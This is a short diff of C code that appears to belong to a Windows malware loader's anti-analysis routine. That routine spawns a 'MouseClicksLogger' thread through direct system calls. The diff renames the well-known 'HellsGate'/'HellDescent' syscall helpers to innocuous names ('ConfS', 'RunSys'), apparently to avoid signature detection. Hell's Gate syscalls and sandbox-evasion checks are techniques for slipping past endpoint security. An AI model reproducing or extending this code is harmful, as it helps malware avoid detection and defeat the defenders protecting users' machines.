@@ -223,8 +223,8 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds) {
 #endif
 
 		// Creating a thread that runs 'MouseClicksLogger' function
-		HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
-		if ((STATUS = HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
+		ConfS(g_Sys.NtCreateThreadEx.wSystemCall);
+		if ((STATUS = RunSys(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
 #if DEBUG
 			PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
 #endif
@@ -232,16 +232,16 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds) {
 		}
 
 		// Waiting for the thread for 'dwMilliSeconds'
-		HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
-		if ((STATUS = HellDescent(hThread, FALSE, &DelayInterval)) != 0 && STATUS != STATUS_TIMEOUT) {
+		ConfS(g_Sys.NtWaitForSingleObject.wSystemCall);
+		if ((STATUS = RunSys(hThread, FALSE, &DelayInterval)) != 0 && STATUS != STATUS_TIMEOUT) {
 #if DEBUG
 			PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
 #endif
 			return FALSE;
 		}
 
-		HellsGate(g_Sys.NtClose.wSystemCall);
-		if ((STATUS = HellDescent(hThread)) != 0) {
+		ConfS(g_Sys.NtClose.wSystemCall);
+		if ((STATUS = RunSys(hThread)) != 0) {
 #if DEBUG
 			PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
 #endif
